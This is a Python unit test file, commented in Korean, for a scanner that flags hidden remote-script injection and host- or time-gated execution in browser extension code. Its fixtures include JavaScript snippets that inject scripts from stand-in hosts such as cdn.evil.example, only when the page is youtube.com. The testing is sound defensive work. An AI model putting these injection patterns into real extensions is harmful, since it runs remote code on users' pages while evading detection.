"""evasion_injection_scan 단위 테스트.

기사(boannews idx=144344) 시나리오 대응:
- 숨겨진 JS를 페이지에 주입(createElement('script') + src/코드 할당)
- 시간/호스트 조건부 실행으로 탐지 회피(location.hostname 비교, getHours 게이팅)
- 주입 + 회피 동시 발생 시 심각도 상향(스모킹 건)
"""

from scanners.evasion_injection_scan import run_evasion_injection_scan


def _entry(content, relative_path="content.js"):
    return {
        "file_name": relative_path.rsplit("/", 1)[-1],
        "relative_path": relative_path,
        "content": content,
    }


def _run(content, relative_path="content.js", manifest=None):
    report = {"manifest": manifest or {}}
    return run_evasion_injection_scan(report, [_entry(content, relative_path)])


def _rule_ids(result):
    return {f["rule_id"] for f in result["findings"]}


def test_benign_file_has_no_findings():
    result = _run("console.log('hello'); const x = 1 + 2;")
    assert result["findings"] == []
    assert result["scanner"] == "evasion_injection_scan"


def test_return_shape_contract():
    result = _run("document.createElement('script')")
    assert set(result.keys()) == {"scanner", "summary", "findings", "severity_counts"}
    assert "pattern_hits" in result["summary"]


def test_script_element_creation_flagged():
    result = _run("var s = document.createElement('script'); document.body.appendChild(s);")
    assert "create_script_element" in _rule_ids(result)


def test_remote_script_injection_is_high():
    content = "var s=document.createElement('script'); s.src='https://evil.example/p.js'; document.head.appendChild(s);"
    result = _run(content)
    inj = [f for f in result["findings"] if f["rule_id"] == "inject_remote_script"]
    assert inj and inj[0]["severity"] == "HIGH"


def test_hostname_equality_gate_flagged():
    result = _run("if (location.hostname === 'youtube.com') { run(); }")
    assert "host_conditional_exec" in _rule_ids(result)


def test_time_based_gate_is_low_and_not_combined():
    result = _run("if (new Date().getHours() === 3) { trigger(); }")
    ids = _rule_ids(result)
    assert "time_conditional_exec" in ids
    assert "evasive_injection" not in ids  # 주입 신호가 없으면 결합 finding 없음


def test_article_pattern_injection_plus_host_evasion_is_critical():
    # 기사 핵심: 특정 사이트에서만 숨겨진 원격 스크립트를 주입
    content = (
        "if (location.hostname.indexOf('youtube.com') !== -1) {"
        "  var s = document.createElement('script');"
        "  s.src = 'https://cdn.evil.example/inject.js';"
        "  document.documentElement.appendChild(s);"
        "}"
    )
    result = _run(content)
    ids = _rule_ids(result)
    assert "inject_remote_script" in ids
    assert "host_conditional_exec" in ids
    combined = [f for f in result["findings"] if f["rule_id"] == "evasive_injection"]
    assert combined, "주입 + 회피 동시 발생 시 결합 finding이 있어야 함"
    assert combined[0]["severity"] == "CRITICAL"


def test_pure_host_check_without_injection_has_no_combined():
    result = _run("if (location.hostname === 'example.com') { showBanner(); }")
    ids = _rule_ids(result)
    assert "host_conditional_exec" in ids
    assert "evasive_injection" not in ids


def test_library_file_is_downgraded():
    content = "var s=document.createElement('script'); s.src='https://x.example/a.js'; document.head.appendChild(s);"
    result = _run(content, relative_path="vendor/analytics.min.js")
    inj = [f for f in result["findings"] if f["rule_id"] == "inject_remote_script"]
    assert inj and inj[0]["severity"] == "LOW"
